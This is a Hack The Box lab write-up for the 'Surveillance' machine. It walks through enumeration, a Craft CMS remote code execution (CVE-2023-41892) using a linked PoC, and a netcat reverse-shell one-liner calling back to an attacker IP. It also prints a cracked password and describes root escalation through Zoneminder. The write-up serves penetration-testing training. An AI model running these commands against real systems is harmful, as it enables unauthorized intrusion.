# Surveillance


<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/6acae25e-f039-4ff6-b160-876222d82942" align="center" alt="keeper-htb" />
</p>



## Introduction :

The Surveillance machine on Hack The Box presented a challenging learning opportunity. The journey involved Nmap scanning, web enumeration, and directory busting to discover an admin login on Craft CMS. Leveraging a Remote Code Execution (RCE) exploit, initial access was gained, leading to the discovery of a user named Matthew. After cracking Matthew's password, SSH access was achieved.

The privilege escalation involved MySQL credentials, "zoneminder" configurations, and a version-specific exploit using Metasploit. Despite challenges, a method to escalate privileges to root was found by manipulating the "user" parameter in zmupdate.pl. The write-up underscores the importance of thorough reconnaissance, exploit analysis, and creative problem-solving in successfully navigating the complexities of the Surveillance machine on HTB.


## Ennumiration :

We start with simple port & services scan and got two standard ports. When we access the web page, it has a specific CMS.

```bash
nmap -p- -T4 -A -sV 10.10.11.245
```

Because HTTP is an open protocol, we can verify whether a webpage can be seen in a web browser.

```bash
sudo echo "10.10.11.245 surveillance" >> /etc/hosts
```
The website appears to be experiencing difficulty locating the site. In such instances, you can resolve the issue by adding the IP and DNS name to the /etc/hosts file.

## Enumerating Directories

Now that we have access to the webpage, let's engage in directory enumeration. In this scenario, we will employ GoBuster.
```bash
gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.4-medium.txt -x .php,.html,.txt,.zip
```

I’ve obtained access to an admin login, and it’s running on Craft CMS.

I examined the source code of surveillance.htb/index.php and determined the version it is running.

Upon researching the version online, I discovered a proof of concept for Remote Code Execution (RCE).

## Exploit :

This Gist provides a Proof-of-Concept (POC) for CVE-2023-41892, a Craft CMS vulnerability that allows Remote Code Execution (RCE).


CVE-2023-41892 is a security vulnerability discovered in Craft CMS, a popular content management system. Craft CMS versions affected by this vulnerability allow attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application.

POC-  https://raw.githubusercontent.com/MrGovindDubey/HTB-Machines/Master/10.10.11.245/poc.py?token=GHSAT0AAAAAACHXKJYFWLBRMVD3Q3QPV74OZOY4YUQ

You need to edit this part of the script for it to work.

```bash 
response = requests.post(url,  headers=headers, data=data, proxies={"http" : http://127.0.0.1:8080"}} 
```

It should get you a shell.

```bash 
python3 POC.py http://surveillance.htb/
```

After successfully exploit and gaining initial access using the PoC, the subsequent step involves obtaining a secure and robust shell for executing bash commands.

I found the following one-liner:

```bash

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.11.246 4444 >/tmp/f

```

— THE IP AND PORT CAN BE CUSTOMIZED ACCORDING TO USER PREFERENCES.

To elaborate:

The rm command eliminates any pre-existing file at /tmp/f.
The mkfifo command generates a named pipe at /tmp/f.
The cat | /bin/bash pipeline forms an interactive Bash shell linked to the named pipe.
The nc command initiates a network connection, channeling the entire output, including the Bash shell output, back into the named pipe.

This should result in a fully operational shell.
```bash
nc -nvlp 4444
```

During my exploration, I stumbled upon a backup directory nestled within the storage repository.

Subsequently, I proceeded to relocate or duplicate the directory, transitioning it from the storage folder to the hosted web server.

Following this relocation, I initiated a wget command to extract and retrieve the contents of the file, thereby incorporating the backup data into the current environment.

I extracted the contents of the file and examined them to locate specific credentials. Within the extracted data, I identified a user named Matthew along with an encrypted password.

To discern the hashing algorithm employed for Matthew's password, I employed Hash-Identifier. The analysis suggests that the hash might have been generated using SHA-256.


### Password:
Subsequently, I appended the hashed password to a text file and employed hashcat to initiate the password cracking process.

The password cracking operation was successful, and the decrypted password has been obtained.


```bash

Username: Matthew
Password: starcraft122490

```

I attempted it on SSH, and it worked flawlessly



## Root Privilege Escalation : 

I ran LinPEAS from my Python server to investigate credentials.

I came across MySQL credentials that appear to correspond to the database stored in the storage/backups directory.

Subsequently, I uncovered a password associated with something referred to as "zoneminder."




Upon examining the configurations linked to "zoneminder," a deeper dive into research unveiled that Zoneminder is a software primarily designed for monitoring purposes. Given its local storage, the next step involves establishing a port forward using SSH.



Once logged in, the initial checkpoint is to verify if the content can be displayed locally, a process that should yield results akin to a specific display format.


Encountering a roadblock with the default credentials "admin:admin" failing to grant access to the login page, the focus shifts towards identifying the version number. It is discerned as version 1.36.32, serving as a crucial reference point in the pursuit of potential exploits.



An available Proof of Concept (PoC) exploit for Zoneminder is explored, yet attempts to establish a connection after sending the payload prove futile.



Metasploit presents an exploit pertaining to snapshots in Zoneminder. Curiously, while the Metasploit script successfully executes, the accompanying Proof of Concept (PoC) falls short, introducing an unusual complication.



To explore potential avenues for privilege escalation, the `sudo -l` command is invoked. Subsequently, a stable shell is spawned using Python to navigate the system.



After scouring online resources, a method for escalating privileges to root is uncovered. This involves manipulating the "user" parameter within `zmupdate.pl` to input a file directory instead of a user, integrating the previously discovered password. This modified configuration is employed to execute a reverse shell script, subsequently transferred via the Python server using `wget`.



Essential to the execution of the script is the incorporation of Busybox to access the `netcat` command. Placement of the required components is flexible, but adherence to good practice recommends housing them in the `tmp` folder.



Preparation of the attacker to listen on specified ports is undertaken diligently.



Finally, the meticulously configured script is executed, paving the way for further exploration and potential actions within the system.



<hr>
</hr>

## CVE-2023-41892 :

Craft CMS serves as a platform for building digital experiences. A high-impact, low-complexity attack vector has been identified. Users utilizing Craft installations prior to version 4.4.15 are advised to update to at least this version to address the issue. The problem has been resolved in Craft CMS 4.4.15.

POC -  This POC is depending on writing webshell, so finding a suitable folder with writable permission is necessary. 

__Code__ :  https://raw.githubusercontent.com/MrGovindDubey/HTB-Machines/Master/10.10.11.245/poc.py?token=GHSAT0AAAAAACHXKJYFWLBRMVD3Q3QPV74OZOY4YUQ

_Reference:_ 
- https://nvd.nist.gov/vuln/detail/CVE-2023-41892
- https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

<hr>
</hr>

# Conclusion, 

The Surveillance machine on Hack The Box provided a valuable learning experience in penetration testing. The journey involved thorough enumeration, exploitation of Craft CMS vulnerabilities, and overcoming unexpected challenges in privilege escalation. The  highlights the importance of continuous learning, adaptability, and creative problem-solving in cybersecurity. Overall, the experience served as a practical lesson in real-world scenarios, refining essential skills for effective ethical hacking practices.


